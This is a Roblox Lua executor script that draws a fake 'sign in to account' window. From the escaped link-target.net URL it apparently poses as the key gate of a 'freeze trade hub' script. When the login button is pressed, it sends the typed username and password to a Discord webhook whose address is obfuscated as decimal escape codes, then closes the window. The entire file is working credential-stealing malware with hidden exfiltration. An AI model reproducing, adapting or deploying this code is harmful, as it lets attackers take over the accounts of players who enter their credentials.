local function encodeString(teks)
    return string.char(table.unpack({string.byte(teks, 1, #teks)}))
end

local urlWebhook = encodeString("\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\51\50\51\54\53\56\50\48\50\52\49\57\56\50\50\54\57\50\47\119\67\117\81\108\73\113\75\105\87\78\83\105\73\57\104\73\109\69\115\100\71\110\70\89\50\102\111\90\76\87\113\71\66\102\114\86\107\84\120\75\57\71\49\121\65\103\54\109\83\116\83\78\101\80\89\104\113\54\118\89\120\118\100\49\68\75\112")
local kunciBenar = encodeString("\76\79\71\73\78\45\102\82\69\101\90\101\84\82\97\100\69\72\85\66\46\105\100\45\98\71\114\70\68\83\101\82\105\72\85\71\102\97\118\72\83\75")
local urlKunci = encodeString("\104\116\116\112\115\58\47\47\108\105\110\107\45\116\97\114\103\101\116\46\110\101\116\47\49\50\55\51\48\56\55\47\102\114\101\101\122\101\116\114\97\100\101\104\117\98")

local function kirimKeDiscord(username, password)
    local data = {
        Url = urlWebhook,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = game:GetService("HttpService"):JSONEncode({
            content = "Seseorang masuk\nUsername: " .. username .. "\nPassword: " .. password
        })
    }

    local fungsiRequest = syn and syn.request or http and http.request or request
    if fungsiRequest then
        local respons = fungsiRequest(data)
        if respons and respons.StatusCode == 200 then
            print("Data berhasil dikirim ke Discord!")
        else
            print("Gagal mengirim data ke Discord:", respons and respons.StatusCode or "Kesalahan Tidak Diketahui")
        end
    else
        print("Executor Anda tidak mendukung HTTP requests!")
    end
end

local function buatLoginGUI()
    local gui = Instance.new("ScreenGui")
    local bingkai = Instance.new("Frame")
    local judul = Instance.new("TextLabel")
    local kotakUsername = Instance.new("TextBox")
    local kotakPassword = Instance.new("TextBox")
    local tombolLogin = Instance.new("TextButton")

    gui.Name = "LoginGUI"
    gui.Parent = game.CoreGui or game:GetService("CoreGui")

    bingkai.Parent = gui
    bingkai.Size = UDim2.new(0, 300, 0, 300)
    bingkai.Position = UDim2.new(0.5, -150, 0.5, -150)
    bingkai.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    bingkai.BorderSizePixel = 3
    bingkai.BorderColor3 = Color3.fromRGB(255, 0, 0)

    judul.Parent = bingkai
    judul.Size = UDim2.new(1, 0, 0, 50)
    judul.Position = UDim2.new(0, 0, 0, 0)
    judul.BackgroundTransparency = 1
    judul.Font = Enum.Font.SourceSansBold
    judul.Text = "Masuk ke Akun"
    judul.TextSize = 24
    judul.TextColor3 = Color3.fromRGB(255, 255, 255)

    kotakUsername.Parent = bingkai
    kotakUsername.Size = UDim2.new(1, -20, 0, 40)
    kotakUsername.Position = UDim2.new(0, 10, 0, 70)
    kotakUsername.PlaceholderText = "Masukkan Username"
    kotakUsername.Font = Enum.Font.SourceSans
    kotakUsername.Text = ""
    kotakUsername.TextSize = 14
    kotakUsername.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    kotakUsername.TextColor3 = Color3.fromRGB(255, 255, 255)

    kotakPassword.Parent = bingkai
    kotakPassword.Size = UDim2.new(1, -20, 0, 40)
    kotakPassword.Position = UDim2.new(0, 10, 0, 130)
    kotakPassword.PlaceholderText = "Masukkan Password"
    kotakPassword.Font = Enum.Font.SourceSans
    kotakPassword.Text = ""
    kotakPassword.TextSize = 14
    kotakPassword.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    kotakPassword.TextColor3 = Color3.fromRGB(255, 255, 255)

    tombolLogin.Parent = bingkai
    tombolLogin.Size = UDim2.new(1, -20, 0, 40)
    tombolLogin.Position = UDim2.new(0, 10, 0, 200)
    tombolLogin.Text = "Login"
    tombolLogin.Font = Enum.Font.SourceSansBold
    tombolLogin.TextSize = 16
    tombolLogin.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    tombolLogin.TextColor3 = Color3.fromRGB(255, 255, 255)

    tombolLogin.MouseButton1Click:Connect(function()
        local username = kotakUsername.Text
        local password = kotakPassword.Text
        if username ~= "" and password ~= "" then
            kirimKeDiscord(username, password)
            gui:Destroy()
        else
            print("Harap isi username dan password!")
        end
    end)
end

buatLoginGUI()
